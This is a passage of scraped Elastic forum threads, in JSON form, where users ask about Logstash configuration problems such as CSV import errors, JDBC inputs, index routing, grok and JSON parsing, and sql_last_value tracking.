    "title": "Looking for a way, size of log event",
    "category": [
      "Logstash"
    ],
    "author": "shwesinhan",
    "date": "March 24, 2020, 10:37am March 24, 2020, 12:29pm April 14, 2020, 8:51am",
    "body": "Hello community, Is there any way to know message size in b or kb or mb or any unit of digital info in logstash? eg: logstash get message ABCDEFBADFASFD13241325POIYTUUBLABLABLA How can we know that message size? Is that possible in logstash? Which plugin is suitable? appreciate any idea",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9a627caa-dfff-47d9-8d69-d86ab874ce04",
    "url": "https://discuss.elastic.co/t/the-records-in-the-elastic-index-are-missing-frequenlty/227738",
    "title": "The records in the elastic index are missing frequenlty",
    "category": [
      "Logstash"
    ],
    "author": "tharak",
    "date": "April 13, 2020, 7:35am April 13, 2020, 7:46am April 13, 2020, 9:16am April 13, 2020, 9:24am April 13, 2020, 9:37am April 13, 2020, 9:43am April 13, 2020, 9:56am April 13, 2020, 1:07pm April 14, 2020, 1:29am April 14, 2020, 5:51am April 14, 2020, 6:10am April 14, 2020, 6:49am April 14, 2020, 7:25am April 14, 2020, 7:32am",
    "body": "I had a record in the elastic index which was indexed by logstash from a sql data source. This record which is already came to elastic index is not available after sometime. After updating the record in the database does the logstash removes the existed record in the elastic index and it will re-index the record with the new updated record ?",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "d899ebc1-1b1c-40b7-bda7-ff29b1b3704b",
    "url": "https://discuss.elastic.co/t/logstash-doesnt-loop-log-data-to-es/227835",
    "title": "Logstash doesn't loop log data to ES",
    "category": [
      "Logstash"
    ],
    "author": "hibfnv",
    "date": "April 14, 2020, 1:33am April 14, 2020, 6:07am",
    "body": "Here's the logstash start process result: /opt/logstash/bin/logstash -f /opt/logstash/config/logstash.conf Sending Logstash logs to /opt/logstash/logs which is now configured via log4j2.properties [2020-04-14T09:11:20,604][WARN ][logstash.config.source.multilocal] Ignoring the 'pipelines.yml' file because modules or command line options are specified [2020-04-14T09:11:20,844][INFO ][logstash.runner ] Starting Logstash {\"logstash.version\"=>\"7.6.2\"} [2020-04-14T09:11:24,473][INFO ][org.reflections.Reflections] Reflections took 88 ms to scan 1 urls, producing 20 keys and 40 values [2020-04-14T09:11:28,066][INFO ][logstash.outputs.elasticsearch][main] Elasticsearch pool URLs updated {:changes=>{:removed=>[], :added=>[http://10.71.4.9:9200/]}} [2020-04-14T09:11:28,530][WARN ][logstash.outputs.elasticsearch][main] Restored connection to ES instance {:url=>\"http://10.71.4.9:9200/\"} [2020-04-14T09:11:28,650][INFO ][logstash.outputs.elasticsearch][main] ES Output version determined {:es_version=>7} [2020-04-14T09:11:28,660][WARN ][logstash.outputs.elasticsearch][main] Detected a 6.x and above cluster: the `type` event field won't be used to determine the document _type {:es_version=>7} [2020-04-14T09:11:28,899][INFO ][logstash.outputs.elasticsearch][main] New Elasticsearch output {:class=>\"LogStash::Outputs::ElasticSearch\", :hosts=>[\"//10.71.4.9:9200\"]} [2020-04-14T09:11:29,029][INFO ][logstash.outputs.elasticsearch][main] Using default mapping template [2020-04-14T09:11:29,117][WARN ][org.logstash.instrument.metrics.gauge.LazyDelegatingGauge][main] A gauge metric of an unknown type (org.jruby.specialized.RubyArrayOneObject) has been created for key: cluster_uuids. This may result in invalid serialization. It is recommended to log an issue to the responsible developer/development team. [2020-04-14T09:11:29,129][INFO ][logstash.javapipeline ][main] Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>8, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>1000, \"pipeline.sources\"=>[\"/opt/logstash/config/logstash.conf\"], :thread=>\"#<Thread:0x3ede1de4 run>\"} [2020-04-14T09:11:29,317][INFO ][logstash.outputs.elasticsearch][main] Attempting to install template {:manage_template=>{\"index_patterns\"=>\"logstash-*\", \"version\"=>60001, \"settings\"=>{\"index.refresh_interval\"=>\"5s\", \"number_of_shards\"=>1}, \"mappings\"=>{\"dynamic_templates\"=>[{\"message_field\"=>{\"path_match\"=>\"message\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false}}}, {\"string_fields\"=>{\"match\"=>\"*\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false, \"fields\"=>{\"keyword\"=>{\"type\"=>\"keyword\", \"ignore_above\"=>256}}}}}], \"properties\"=>{\"@timestamp\"=>{\"type\"=>\"date\"}, \"@version\"=>{\"type\"=>\"keyword\"}, \"geoip\"=>{\"dynamic\"=>true, \"properties\"=>{\"ip\"=>{\"type\"=>\"ip\"}, \"location\"=>{\"type\"=>\"geo_point\"}, \"latitude\"=>{\"type\"=>\"half_float\"}, \"longitude\"=>{\"type\"=>\"half_float\"}}}}}}} [2020-04-14T09:11:31,820][INFO ][logstash.inputs.file ][main] No sincedb_path set, generating one based on the \"path\" setting {:sincedb_path=>\"/opt/logstash/data/plugins/inputs/file/.sincedb_2ce6f232da790296fc018978c1ba0a04\", :path=>[\"/var/log/*.log\", \"/var/log/message\"]} [2020-04-14T09:11:31,889][INFO ][logstash.javapipeline ][main] Pipeline started {\"pipeline.id\"=>\"main\"} [2020-04-14T09:11:32,023][INFO ][logstash.agent ] Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>[]} [2020-04-14T09:11:32,039][INFO ][filewatch.observingtail ][main] START, creating Discoverer, Watch with file and sincedb collections [2020-04-14T09:11:32,609][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9600} as the logstash input and output configuration file as below: input { file { path => [\"/var/log/*.log\",\"/var/log/message\"] type => \"system\" start_position => \"beginning\" } } output { elasticsearch { hosts => [\"10.71.4.9:9200\"] index => \"system-log-%{+YYYY.MM.dd}\" } stdout { codec => rubydebug } } as the logstash start the first time it's working there and has data loop to ES then no update. The kibana screen shows that there's no data after 16:00 yesterday. IMG_04140911482×657 69.3 KB",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9ad469bb-fd51-492e-848d-c51c764e681e",
    "url": "https://discuss.elastic.co/t/can-we-use-logstash-to-gather-information-by-snmp-pool/227850",
    "title": "Can we use logstash to gather information by SNMP Pool?",
    "category": [
      "Logstash"
    ],
    "author": "psanggabuana",
    "date": "April 14, 2020, 5:01am",
    "body": "Hi Everyone, I want to gather information by SNMP Pool. Can we use logstash plugin for this? Thank you",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "73763c12-90f4-4a0f-94b6-fb9c0341230a",
    "url": "https://discuss.elastic.co/t/extract-server-name-from-fqdn/224503",
    "title": "Extract server name from fqdn",
    "category": [
      "Logstash"
    ],
    "author": "vijay_kaali",
    "date": "March 21, 2020, 4:15am March 22, 2020, 4:46pm March 23, 2020, 1:44pm March 23, 2020, 2:49pm April 14, 2020, 4:45am",
    "body": "in beat.hostname, some are in CAPS / small , lower /upper case characters . To stabilize the search, i want to extract server name without fqdn and store in new field in lower case i tried following mutate { split => { \"beat.Hostname\" => \".\" } add_field => { \"host1\" => \"%{[beat][Hostname][1]}\" } lowercase => [ \"host1\" ] } mutate { add_field => { \"host2\" => \"beat.Hostname\"] split => { \"host2\" => \".\" } add_field => { \"host1\" => \"%{host2[0]}\" } lowercase => [ \"host1\" ] } but in both cases host1 value %{[beat][Hostname][1]}\" or \"%{host2[0]}\" or in elk Am i missing anything",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "b55867cf-d7d3-4fd0-96d4-7a644192efc7",
    "url": "https://discuss.elastic.co/t/multiple-output-by-timestamp-filter-in-logstash/227842",
    "title": "Multiple Output by @timestamp filter in Logstash",
    "category": [
      "Logstash"
    ],
    "author": "newbie001",
    "date": "April 14, 2020, 3:00am",
    "body": "Hello - Is there a way I can output the message in different files by @timestamp in logstash? These are all outputted in JSON Files. I am very new to logstash and I am not quite sure on how to output it in multiple files by its different timestamp. Actual output is this: { \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:36:25.441Z\", \"message\": \"#Money Exchange Rate\\r\\n250\\r\\n#Date of Export\\r\\nWed Jan 20 09:40:12 2018\\r\\n#Current Exchange\\r\\nSGDUSD\\r\\n#MoneyCounter\\r\\n207 \\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\" }{ \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:36:25.497Z\", \"message\": \"#----- Start Task -----\\r\\n\\r\\n#Location\\r\\nOrchard Road\\\\Singapore\\\\01ACVB\\\\125\\r\\n#Counter ID\\r\\n7008\\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\" }{ \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:37:02.809Z\", \"message\": \"#----- Start Task -----\\r\\n\\r\\n#Location\\r\\nDotonburi\\\\Japan\\\\98CVBS\\\\112\\r\\n#Counter ID\\r\\n9001\\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\" } Expected output: (should have 3 outputs) Output 1: { \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:36:25.441Z\", \"message\": \"#Money Exchange Rate\\r\\n250\\r\\n#Date of Export\\r\\nWed Jan 20 09:40:12 2018\\r\\n#Current Exchange\\r\\nSGDUSD\\r\\n#MoneyCounter\\r\\n207 \\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\" } Output 2: { \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:36:25.497Z\", \"message\": \"#----- Start Task -----\\r\\n\\r\\n#Location\\r\\nOrchard Road\\\\Singapore\\\\01ACVB\\\\125\\r\\n#Counter ID\\r\\n7008\\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\" } Output 3: { \"@version\": \"1\", \"@timestamp\": \"2020-03-14T02:37:02.809Z\", \"message\": \"#----- Start Task -----\\r\\n\\r\\n#Location\\r\\nDotonburi\\\\Japan\\\\98CVBS\\\\112\\r\\n#Counter ID\\r\\n9001\\r\", \"tags\": [ \"multiline\" ], \"host\": \"BD001A2A\" }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "bcc3fc8d-6a1a-42c3-a1c7-d4535ebc4505",
    "url": "https://discuss.elastic.co/t/load-csv-data-into-elasticsearch-using-logstash/227820",
    "title": "Load CSV data into ElasticSearch using Logstash",
    "category": [
      "Logstash"
    ],
    "author": "inchirah",
    "date": "April 13, 2020, 8:25pm April 13, 2020, 8:29pm April 13, 2020, 8:52pm April 13, 2020, 10:46pm April 13, 2020, 11:04pm",
    "body": "Hello, I'm trying to import a csv file into ES, when I run the config file I get this : Sending Logstash logs to C:/elastic_stack/logstash-7.6.2/logs which is now configured via log4j2.properties [2020-04-13T20:17:24,421][WARN ][logstash.config.source.multilocal] Ignoring the 'pipelines.yml' file because modules or command line options are specified [2020-04-13T20:17:24,552][INFO ][logstash.runner ] Starting Logstash {\"logstash.version\"=>\"7.6.2\"} [2020-04-13T20:17:27,285][INFO ][org.reflections.Reflections] Reflections took 41 ms to scan 1 urls, producing 20 keys and 40 values [2020-04-13T20:17:28,281][WARN ][logstash.outputs.elasticsearch] You are using a deprecated config setting \"document_type\" set in elasticsearch. Deprecated settings will continue to work, but are scheduled for removal from logstash in the future. Document types are being deprecated in Elasticsearch 6.0, and removed entirely in 7.0. You should avoid this feature If you have any questions about this, please visit the #logstash channel on freenode irc. {:name=>\"document_type\", :plugin=><LogStash::Outputs::ElasticSearch action=>\"index\", index=>\"data-index-1\", id=>\"f50f3d3c35597f0f88ef02b43e31857d7d737980bdf7205aff772cc7d03e2787\", hosts=>[http://localhost:9200/], document_type=>\"data\", enable_metric=>true, codec=><LogStash::Codecs::Plain id=>\"plain_20cd215d-eab9-4a36-b521-77461257297a\", enable_metric=>true, charset=>\"UTF-8\">, workers=>1, manage_template=>true, template_name=>\"logstash\", template_overwrite=>false, doc_as_upsert=>false, script_type=>\"inline\", script_lang=>\"painless\", script_var_name=>\"event\", scripted_upsert=>false, retry_initial_interval=>2, retry_max_interval=>64, retry_on_conflict=>1, ilm_enabled=>\"auto\", ilm_rollover_alias=>\"logstash\", ilm_pattern=>\"{now/d}-000001\", ilm_policy=>\"logstash-policy\", ssl_certificate_verification=>true, sniffing=>false, sniffing_delay=>5, timeout=>60, pool_max=>1000, pool_max_per_route=>100, resurrect_delay=>5, validate_after_inactivity=>10000, http_compression=>false>} [2020-04-13T20:17:30,403][INFO ][logstash.outputs.elasticsearch][main] Elasticsearch pool URLs updated {:changes=>{:removed=>[], :added=>[http://localhost:9200/]}} [2020-04-13T20:17:30,634][WARN ][logstash.outputs.elasticsearch][main] Restored connection to ES instance {:url=>\"http://localhost:9200/\"} [2020-04-13T20:17:30,703][INFO ][logstash.outputs.elasticsearch][main] ES Output version determined {:es_version=>7} [2020-04-13T20:17:30,723][WARN ][logstash.outputs.elasticsearch][main] Detected a 6.x and above cluster: the `type` event field won't be used to determine the document _type {:es_version=>7} [2020-04-13T20:17:30,800][INFO ][logstash.outputs.elasticsearch][main] New Elasticsearch output {:class=>\"LogStash::Outputs::ElasticSearch\", :hosts=>[\"http://localhost:9200/\"]} [2020-04-13T20:17:30,888][INFO ][logstash.outputs.elasticsearch][main] Using default mapping template [2020-04-13T20:17:30,905][ERROR][logstash.javapipeline ][main] Pipeline aborted due to error {:pipeline_id=>\"main\", :exception=>#<LogStash::ConfigurationError: translation missing: en.logstash.agent.configuration.invalid_plugin_register>, :backtrace=>[\"C:/elastic_stack/logstash-7.6.2/vendor/bundle/jruby/2.5.0/gems/logstash-filter-mutate-3.5.0/lib/logstash/filters/mutate.rb:222:in `block in register'\", \"org/jruby/RubyHash.java:1428:in `each'\", \"C:/elastic_stack/logstash-7.6.2/vendor/bundle/jruby/2.5.0/gems/logstash-filter-mutate-3.5.0/lib/logstash/filters/mutate.rb:220:in `register'\", \"org/logstash/config/ir/compiler/AbstractFilterDelegatorExt.java:56:in `register'\", \"C:/elastic_stack/logstash-7.6.2/logstash-core/lib/logstash/java_pipeline.rb:200:in `block in register_plugins'\", \"org/jruby/RubyArray.java:1814:in `each'\", \"C:/elastic_stack/logstash-7.6.2/logstash-core/lib/logstash/java_pipeline.rb:199:in `register_plugins'\", \"C:/elastic_stack/logstash-7.6.2/logstash-core/lib/logstash/java_pipeline.rb:502:in `maybe_setup_out_plugins'\", \"C:/elastic_stack/logstash-7.6.2/logstash-core/lib/logstash/java_pipeline.rb:212:in `start_workers'\", \"C:/elastic_stack/logstash-7.6.2/logstash-core/lib/logstash/java_pipeline.rb:154:in `run'\", \"C:/elastic_stack/logstash-7.6.2/logstash-core/lib/logstash/java_pipeline.rb:109:in `block in start'\"], \"pipeline.sources\"=>[\"C:/Users/Asus/Dropbox/PFE_part2/data_logstash_configuration.conf\"], :thread=>\"#<Thread:0x7921b860 run>\"} [2020-04-13T20:17:30,950][ERROR][logstash.agent ] Failed to execute action {:id=>:main, :action_type=>LogStash::ConvergeResult::**FailedAction, :message=>\"Could not execute action: PipelineAction::Create<main>, action_result: false\", :backtrace=>nil}** [2020-04-13T20:17:31,025][INFO ][logstash.outputs.elasticsearch][main] Attempting to install template {:manage_template=>{\"index_patterns\"=>\"logstash-*\", \"version\"=>60001, \"settings\"=>{\"index.refresh_interval\"=>\"5s\", \"number_of_shards\"=>1}, \"mappings\"=>{\"dynamic_templates\"=>[{\"message_field\"=>{\"path_match\"=>\"message\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false}}}, {\"string_fields\"=>{\"match\"=>\"*\", \"match_mapping_type\"=>\"string\", \"mapping\"=>{\"type\"=>\"text\", \"norms\"=>false, \"fields\"=>{\"keyword\"=>{\"type\"=>\"keyword\", \"ignore_above\"=>256}}}}}], \"properties\"=>{\"@timestamp\"=>{\"type\"=>\"date\"}, \"@version\"=>{\"type\"=>\"keyword\"}, \"geoip\"=>{\"dynamic\"=>true, \"properties\"=>{\"ip\"=>{\"type\"=>\"ip\"}, \"location\"=>{\"type\"=>\"geo_point\"}, \"latitude\"=>{\"type\"=>\"half_float\"}, \"longitude\"=>{\"type\"=>\"half_float\"}}}}}}} [2020-04-13T20:17:31,469][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9600} [2020-04-13T20:17:36,558][INFO ][logstash.runner ] Logstash shut down. This is my conf file: input{ file{ path => \"C:\\Users\\Asus\\Dropbox\\PFE_part2\\MOOV_ALEPE_Data.csv\" start_position => \"beginning\" } } filter{ csv { columns => [ \"Message\", \"Time\", \"Distance\", \"Longitude\", \"Latitude\", \"NemoEvent_GPRS_DataConnectionSuccess_DAC\", \"NemoEvent_GPRS_DataConnectionAttempt_DAA\", \"NemoEvent_GPRS_DataDisconnect_DAD\" ] separator => \",\" } mutate {convert => [\"Longitude\", \"half_float\"]} mutate {convert => [\"Latitude\", \"half_float\"]} mutate {convert => [\"NemoEvent_GPRS_DataConnectionSuccess_DAC\", \"integer\"]} mutate {convert => [\"NemoEvent_GPRS_DataConnectionAttempt_DAA\", \"integer\"]} mutate {convert => [\"NemoEvent_GPRS_DataDisconnect_DAD\", \"integer\"]} } output{ elasticsearch { action => \"index\" hosts => [\"http://localhost:9200/\"] index => \"data-index-1\" document_type => \"data\" } stdout { } } Could you help me please?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "74006ace-2327-45f6-9bae-ce2bc1d534ae",
    "url": "https://discuss.elastic.co/t/reuse-db-connection-driverclass-for-jdbc-inputs-in-logstash/227808",
    "title": "Reuse db connection,driverclass, for jdbc inputs in logstash",
    "category": [
      "Logstash"
    ],
    "author": "David_Samm",
    "date": "April 13, 2020, 5:49pm April 13, 2020, 6:08pm April 13, 2020, 7:38pm April 13, 2020, 10:41pm",
    "body": "input { jdbc { jdbc_connection_string => \"jdbc:oracle:thin:@***:1521/***\" jdbc_user => \"***\" jdbc_password => \"***\" jdbc_validate_connection => true jdbc_driver_library => \"/opt/logstash-5.5.0/ojdbc6.jar\" jdbc_driver_class => \"Java::oracle.jdbc.driver.OracleDriver\" statement => \"SELECT ID, Field1, Field2 from tableDb1\" } jdbc { jdbc_connection_string => \"jdbc:oracle:thin:@***:1521/***\" jdbc_user => \"***\" jdbc_password => \"***\" jdbc_validate_connection => true jdbc_driver_library => \"/opt/logstash-5.5.0/ojdbc6.jar\" jdbc_driver_class => \"Java::oracle.jdbc.driver.OracleDriver\" statement => \"SELECT ID, Field3, Field4 from tableDb2\" } } output { elasticsearch { index => \"myIndex\" document_type => \"myDocument\" document_id => %{id} hosts => \"localhost\" } } 'Here I want to reuse the jdbc connections besides writing every time for JDBC input '",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "6ce04879-bfcd-4ba0-9897-58ec12bea767",
    "url": "https://discuss.elastic.co/t/how-send-the-log-to-different-index-in-kibana/227817",
    "title": "How send the log to different index in Kibana",
    "category": [
      "Logstash"
    ],
    "author": "Prabhu_Chinnasamy",
    "date": "April 13, 2020, 6:57pm April 13, 2020, 6:58pm April 13, 2020, 7:02pm April 13, 2020, 7:10pm April 13, 2020, 8:27pm April 13, 2020, 9:20pm",
    "body": "I am new to Elastic stack and trying to see the different logs under different Kiban indexes. for an example, I am trying to place the logs from my dhcp server under a index called \"DHCP\". My logstash config is as below, but I am not seeing the new index created for DHCP and still all the logs are going under the default filebeat index. '''''''''''''''''''''''''''''''''''' input { beats { port => 5044 } } output { if [log.file.path] in [C:\\Windows\\system32\\dhcp*]{ elasticsearch { hosts => [\"http://localhost:9200\"] index => \"DHCP-%{+YYYY.MM.dd}\" user => \"CCCCCC\" password => \"CCCCCC\" } }else { elasticsearch { hosts => [\"http://localhost:9200\"] index => \"%{[@metadata][beat]}-%{[@metadata][version]}-%{+YYYY.MM.dd}\" user => \"CCCCCC\" password => \"XXXXXXXXX\" } } } ''''''''''''''''''''''''''''''",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "87a5f68a-8579-41fd-9966-748d1dcb158a",
    "url": "https://discuss.elastic.co/t/unable-to-send-json-to-elastic/227639",
    "title": "Unable to send json to elastic",
    "category": [
      "Logstash"
    ],
    "author": "Magnuss",
    "date": "April 11, 2020, 10:04pm April 11, 2020, 11:12pm April 12, 2020, 8:21am April 12, 2020, 1:02pm April 12, 2020, 3:02pm April 12, 2020, 5:59pm April 12, 2020, 6:33pm April 12, 2020, 6:46pm April 12, 2020, 8:35pm April 12, 2020, 8:28pm April 12, 2020, 8:34pm April 12, 2020, 10:07pm April 13, 2020, 9:18am April 13, 2020, 5:35pm April 13, 2020, 5:43pm April 13, 2020, 7:25pm",
    "body": "Hi, I have some issues sending a json file to elastic. Logstash can connect to elastic and also in the logging are no errors. I may think it has to do with the json file or maybe the format.(or do i need to use the filter?) input { file { path => \"/var/log/logstash/data/data*.json\" } } output { elasticsearch { index => \"%{[ecs-file]}\" hosts => [\"192.168.23.135\"] } }",
    "website_area": "discuss",
    "replies": 16
  },
  {
    "id": "fa38b7db-2f9a-4e01-8653-51366bd78bbb",
    "url": "https://discuss.elastic.co/t/issue-pulling-data-from-elasticsearch-with-date-parameter/227793",
    "title": "Issue pulling data from elasticsearch with date parameter",
    "category": [
      "Logstash"
    ],
    "author": "bheierle",
    "date": "April 13, 2020, 5:35pm",
    "body": "Yes I am pulling data from elastic search. The below source conf file does work. My issue is the syntax does not seem to match that of native elastic search when trying to use a filter. I would like to simply return all columns but have a field called orderDate and would like to only get the last 30 days of records. Has anyone had experience in this area? Any help would be highly appreciated. 'input' '{' 'elasticsearch {' 'hosts => [\"https://servername\"]' 'index => \"billing_event\"' '}'",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "600efa47-8664-4424-9693-a36013bd6e1a",
    "url": "https://discuss.elastic.co/t/unable-to-process-attachments-using-logstash-7-6-0-imap-input-plugin/227416",
    "title": "Unable to process attachments using logstash 7.6.0 IMAP Input plugin",
    "category": [
      "Logstash"
    ],
    "author": "Diptee",
    "date": "April 9, 2020, 11:03pm April 9, 2020, 11:35pm April 13, 2020, 2:13pm",
    "body": "I have configured logstash input to process emails from Gmail/Outlook using IMAP Input plugin. I am getting error when the email contains attachments or images. Sample config below- input { imap { host => \"xyz.com\" password => \"acc\" user => \"user\" content_type => \"multipart/alternative\" } } Below error details- Encountered error NoMethodError {:message=>Can not decode an entire message, try calling #decoded on the various fields and body or parts if it is a multipart message. Any help appreciated. Thanks.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "906e19b8-ecfd-4a07-bd3a-1bfb4d3cbe8a",
    "url": "https://discuss.elastic.co/t/how-to-parse-multiple-json-using-logstash-which-can-occure-anywhere-in-the-log/227781",
    "title": "How to parse multiple json using logstash which can occure anywhere in the log",
    "category": [
      "Logstash"
    ],
    "author": "Preyas_Mistry",
    "date": "April 13, 2020, 1:53pm",
    "body": "I want to parse this log into ES which has multiple JSON string in it, the position of JSON is not fixed! 2020-03-30 17:42:15,672 INFO [DefaultMessageListenerContainer-4] (MeetingServiceImpl.getMeetingParticipants:270) - {\"a\": 123, \"b\": { \"b1\": 234 } } some text here {\"c\":\"567\",\"d\":\"789\"} I have tried this logstash filter: filter{ grok { match => { \"message\" => \"%{TIMESTAMP_ISO8601:time} %{LOGLEVEL:logLevel}\\s*\\[(?<thread>([\\w\\-]+|[\\w\\s]+))\\] (\\(%{DATA:className}\\.%{DATA:methodName}:%{NUMBER:lineNumber}\\)) - %{GREEDYDATA:message}\"} overwrite => [ \"message\" ] } ruby { code => \" json1 = event.get('message').match(\\{.*?\\})[1] event.set('json1',json1) \" } json { source => \"json1\" target => \"payload\" } if \"TRACE\" in [logLevel]{ drop { } } date{ match => [\"time\",\"ISO8601\"] target => \"time\" } mutate{ convert => { \"lineNumber\" => \"integer\" } } mutate{ remove_field => [\"@version\",\"offset\",\"tags\",\"agent\",\"ecs\"] } mutate { gsub => [\"message\",\"\\(\", \"=(\"] } kv { source => \"message\" recursive => \"true\" field_split => \",\\s\\(\\)\" value_split => \"=\" trim_key => \"\\s\" target => \"payload\" } if \"_grokparsefailure\" in [tags] { drop { } } ruby { code => \" hash = event.to_hash hash.each { |key,value| if value != nil str = value.to_s if str.blank? event.remove(key) end end } \" } } But got this exception: java.lang.IllegalStateException: Logstash stopped processing because of an error: (SyntaxError) (ruby filter code):3: syntax error, unexpected null json1 = event.get('message').match({.*?})[1] ^ Expected Output: { \"logLevel\" => \"INFO\", \"lineNumber\" => 270, \"methodName\" => \"getMeetingParticipants\", \"payload\" => { \"b\" => { \"b1\" => 234 }, \"a\" => 123, \"c\" => 567, \"d\" => 789 }, \"@timestamp\" => 2020-04-13T09:51:48.333Z, \"host\" => \"ThinkPad-E470\", \"time\" => 2020-03-30T12:12:15.672Z, \"message\" => \"{\"a\": 123, \"b\": { \"b1\": 234 } } some text here {\"c\":567,\"d\":789}\", \"className\" => \"MeetingServiceImpl\", \"path\" => \"/logstashworks/logs/malogs.log\", \"thread\" => \"DefaultMessageListenerContainer-4\" }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "66001adb-b730-48ea-9a77-5f7e0f451a0c",
    "url": "https://discuss.elastic.co/t/dateparsefailure-failing-to-parse-timestamp-field-into-timestamp/227764",
    "title": "_dateparsefailure - Failing to parse timestamp field into @timestamp",
    "category": [
      "Logstash"
    ],
    "author": "",
    "date": "April 13, 2020, 11:06am April 13, 2020, 11:17am April 13, 2020, 11:22am April 13, 2020, 1:47pm April 13, 2020, 1:48pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "271d4d40-6bd9-4ffe-afc3-c5055deda971",
    "url": "https://discuss.elastic.co/t/rabbitmq-configure-read-interval-for-rmq-as-input-plugin/226705",
    "title": "RabbitMQ: Configure read interval for rmq as input plugin",
    "category": [
      "Logstash"
    ],
    "author": "notricky",
    "date": "April 6, 2020, 12:17pm April 13, 2020, 1:28pm",
    "body": "HI! Im new here. Please dont get mad. I would like to know how to set an interval, that fires Logstash to check the RabbitMQ (rmq) for new messages? I was studying the manual to find out which argument would do so, as a stat_interval does for file input plugin. But didn't find. Or the description there doesnt match my search conditions. Or is there another way of communication between Logstash and rmq, for example event-based where rmq just pushes to Logstash new messages? Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "bbdfcdd9-023f-431c-a400-e0849813027a",
    "url": "https://discuss.elastic.co/t/after-adding-prune-filter-logs-are-not-going-to-elastic-search/227614",
    "title": "After adding Prune filter - logs are not going to Elastic search",
    "category": [
      "Logstash"
    ],
    "author": "Vignesh2912",
    "date": "April 11, 2020, 3:41pm April 13, 2020, 10:37am",
    "body": "Hi Team, I am learning ELK and trying to do as a POC for my project. I am applying KV filter for the sample integration logs from my project and i could see lot of extra fields are coming as a result so i have tried to apply prune filter and white-listed certain fields. I can see the logs getting printed in the logstash server but logs are not going to elastic search. If i remove the filter it is going to the elastic search. Please advise how to further debug on this issue. filter { kv { field_split => \"{},?\\[\\]\" transform_key => \"capitalize\" transform_value => \"capitalize\" trim_key => \"\\s\" trim_value => \"\\s\" include_brackets => false } prune { whitelist_names => [ \"App_version\", \"Correlation_id\", \"Env\", \"Flow_name\", \"host\", \"Instance_id\", \"log_level\",\"log_thread\", \"log_timestamp\", \"message\", \"patient_id\", \"status_code\", \"type\", \"detail\"] } } output { elasticsearch { hosts => [\"http://localhost:9200\"] index => \"mule-%{+YYYY.MM.dd}\" #user => \"elastic\" #password => \"changeme\" } stdout { codec => rubydebug } } I also need two more suggestion, I am also trying to use the grok filter in the initial logs and trying to take log level fields(time and log type) from the sample log and send the remaining logs to the KV filter. Is there any reference please share for it. This is what i have tried for it. but getting as _grokparsefailure. I have passed the msgbody to the kv filter with the source option. grok { match => { \"message\" => \"%{TIMESTAMP_ISO8601:timestamp}\\s+%{LOGLEVEL:loglevel}\\s+%{GREEDYDATA:msgbody}\"} overwrite => [ \"msgbody\" ] } I am having message fields inside sample logs as like below. When the data goes to Kibana i can see two message field tag one is with full log and other is with correct message(highlighted). Will the mutate works for this case? Is there any way we can change the full log name as something else ?? [2020-02-10 11:20:07.172] INFO Mule.api [[MuleRuntime].cpuLight.04: [main-api-test].api-main.CPU_LITE @256c5cf5: [main-api-test].main-api-main/processors/0/processors/0.CPU_LITE @378f34b0]: event:00000003 {app_name=main-api-main, app_version=v1, env=Test, timestamp=2020-02-10T11:20:07.172Z, log={correlation_id=00000003, patient_id=12345678, instance_id=hospital, **message**=Start of System API, flow_name=main-api-main}} Thanks! Regards, Vignesh G",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "cef0a60e-5a4d-47ab-b619-dca34f610e4d",
    "url": "https://discuss.elastic.co/t/sql-last-value-not-working-properly/227244",
    "title": "Sql_last_value not working properly",
    "category": [
      "Logstash"
    ],
    "author": "chelseia",
    "date": "April 9, 2020, 6:01am April 13, 2020, 9:29am April 13, 2020, 9:30am",
    "body": "i am trying to ingest the records with following timestamps 01.03.38.75894600 01.03.38.88577300 01.03.39.08149800 .but before that I have successfully ingested 100 rec which having same timestamp.so no w i have my sql last_value _as 01.01.12.23410000. so when the next run comes the above 3 records are updating successfully. But instead of taking the last timestamp(01.03.39.08149800) as the sql_last_value it is assigning the first record (01.03.38.75894600).and in the next run the rest of the 2 records are ingesting again and it is continuning in this manner.can u pls tell how to resolve this.my cobfig file is shown below: input{ jdbc{ clean_run => true jdbc_driver_library => \"C:/Program Files/SQL Developer 4/jdbc/lib/ojdbc8.jar\" jdbc_driver_class => \"Java::oracle.jdbc.driver.OracleDriver\" jdbc_connection_string => \"connection\" jdbc_user => \"\" jdbc_password => \"pwd\" statement => \"select * from bucket_truck where updated_at > :sql_last_value\" tracking_column => \"updated_at\" tracking_column_type => \"timestamp\" use_column_value => true schedule => \"*/1 * * * *\" } } output{ elasticsearch{ hosts =>\"http://localhost:9200\" index =>\"ma1\" document_id 